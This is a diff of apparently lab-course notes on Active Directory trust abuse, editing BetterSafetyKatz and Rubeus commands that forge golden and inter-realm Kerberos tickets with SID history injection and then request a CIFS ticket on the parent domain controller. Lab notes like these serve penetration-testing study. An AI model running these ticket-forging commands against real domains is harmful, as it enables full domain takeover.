@@ -29,7 +29,7 @@ Note that krbtgt can be used instead of the trust key.
 {% code overflow="wrap" %}
 ```powershell
 # Child to parent 
-C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<current_domain_sid> /sids:<sid_to_inject> /rc4:<trust_key> /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
 
 # Using krbtgt hash - No need to request for tgs later
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
@@ -54,7 +54,7 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:d
 {% code overflow="wrap" %}
 ```powershell
 # Same can be done with Rubeus
-Rubeus.exe evasive-silver /service:krbtgt/dollarcorp.moneycorp.local /rc4:<hash> /sid:<sid> /sids:<sids> /;dap /user:Administrator /nowwrap
+Rubeus.exe evasive-silver /service:krbtgt/dollarcorp.moneycorp.local /rc4:<hash> /sid:<sid> /sids:<sids> /ldap /user:Administrator /nowrap
 ```
 {% endcode %}
 
@@ -63,6 +63,8 @@ Rubeus.exe evasive-silver /service:krbtgt/dollarcorp.moneycorp.local /rc4:<hash>
 {% code overflow="wrap" %}
 ```powershell
 # Forge the ticket
-Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorpdc.moneycorp.local /ptt
+Rubeus.exe asktgs /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt /ticket:C:\AD\Tools\trust_tkt.kirbi
 ```
 {% endcode %}
+
+After that any attack can be performed according to the service requested.
